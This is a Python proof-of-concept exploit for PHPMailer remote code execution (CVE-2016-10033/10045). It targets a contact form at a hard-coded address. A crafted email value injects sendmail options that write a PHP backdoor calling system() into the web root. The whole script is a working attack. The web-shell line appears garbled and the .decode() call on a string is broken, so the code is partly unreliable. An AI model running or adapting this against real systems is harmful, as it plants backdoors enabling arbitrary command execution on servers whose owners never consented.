#!/usr/bin/python

import time
from urllib.request import Request, urlopen
from urllib.parse import urlencode
import socket
import sys

RW_DIR = "/var/www/html/vendor"

url = 'http://172.30.0.125/contact.php'  # Set destination URL here

# Choose/uncomment one of the payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
payload = '"attacker\\" -oQ/tmp/ -X%s/exploit.php  some"@email.com' % RW_DIR

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
# payload = "\"attacker\\' -oQ/tmp/ -X%s/exploit.php  some\"@email.com" % RW_DIR

######################################

# PHP code to be saved into the backdoor php file on the target in RW_DIR
RCE_PHP_CODE = '<?php system([\"c\"]); ?>'

post_fields = {'action': 'send', 'name': 'hans',
               'email': payload, 'subject': 'hello', 'message': RCE_PHP_CODE}

# Attack
data = urlencode(post_fields).decode("utf-8")
req = Request(url, data)
response = urlopen(req)
the_page = response.read()
